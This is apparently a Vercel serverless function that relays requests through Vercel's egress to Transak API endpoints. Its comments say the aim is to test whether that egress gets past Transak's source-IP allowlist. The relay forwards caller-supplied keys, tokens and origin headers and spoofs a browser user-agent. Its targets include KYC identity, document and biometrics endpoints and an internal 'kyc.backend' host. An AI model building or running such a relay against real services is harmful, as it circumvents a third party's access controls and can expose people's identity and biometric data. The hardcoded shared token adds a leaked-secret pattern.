// i100119 bounded egress probe running on OUR OWN Vercel project (neo-transak).
// Purpose: measure whether Vercel serverless egress satisfies Transak's api-gateway
// ip_not_allowed source-IP guard. Restricted: fixed host allowlist + shared token.
const ALLOW = {
  "gw": { host: "api-gateway.transak.com", path: "/api/v2/auth/session" },
  "reliance-id": { host: "api-gateway.transak.com", path: "/kyc/v2/reliance/identity-details" },
  "reliance-doc": { host: "api-gateway.transak.com", path: "/kyc/v2/reliance/document-details" },
  "reliance-bio": { host: "api-gateway.transak.com", path: "/kyc/v2/reliance/biometrics" },
  "kycuser": { host: "api-gateway.transak.com", path: "/api/v2/kyc/user" },
  "api-user": { host: "api.transak.com", path: "/api/v2/user" },
  "ts": { host: "api-gateway.transak.com", path: "/api/v2/transaction-session" },
  "internal-reliance": { host: "kyc.backend", path: "/kyc/internal/v2/reliance/identity-details" },
};
const TOKEN = "b7c1e9f04a2d4c6e8a1b3d5f7091c2e4";

module.exports = async (req, res) => {
  const q = req.query || {};
  if (q.t !== TOKEN) { res.status(404).json({ e: "nf" }); return; }
  try {
    if (q.p === "ident") {
      const r = await fetch("https://api.ipify.org?format=json", { signal: AbortSignal.timeout(8000) });
      const txt = await r.text();
      res.status(200).json({ egress: txt });
      return;
    }
    const target = ALLOW[q.p];
    if (!target) { res.status(400).json({ e: "bad target" }); return; }
    const headers = {
      "content-type": q.ct || "application/json",
      "accept": "application/json",
      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    };
    for (const h of ["x-api-key", "access-token", "authorization", "x-user-identifier", "origin", "referer", "apiKey"]) {
      if (typeof q["h_" + h] === "string") headers[h] = q["h_" + h];
    }
    let body = null;
    if (req.method !== "GET" && typeof q.b === "string") body = Buffer.from(q.b, "base64");
    const scheme = target.host.endsWith(".backend") ? "http" : "https";
    const r = await fetch(scheme + "://" + target.host + target.path, {
      method: req.method === "GET" ? "GET" : "POST",
      headers, body: body ? body : undefined, signal: AbortSignal.timeout(15000), redirect: "manual",
    });
    const txt = await r.text();
    const hdrs = {};
    r.headers.forEach((v, k) => { hdrs[k] = v; });
    res.status(200).json({ status: r.status, headers: hdrs, body: txt.slice(0, 6000) });
  } catch (e) {
    res.status(500).json({ e: String(e && e.message || e) });
  }
};
